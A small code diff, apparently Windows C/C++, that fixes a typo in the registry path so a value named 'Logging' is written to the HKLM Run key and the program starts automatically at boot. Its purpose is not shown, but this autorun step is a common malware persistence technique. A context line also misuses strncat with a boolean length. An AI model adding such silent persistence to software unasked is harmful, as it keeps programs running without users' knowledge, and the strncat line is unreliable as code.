@@ -77,7 +77,7 @@ strncat(szCurrent, szPath, true);
 //SetStringValue(HKLM
 
 SetStringValue(HKLM,
-               "SOFTWARE\\Microsoft\\Windows\\CurreentVersion\\Run",
+               "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "Logging",
                szPath);
 
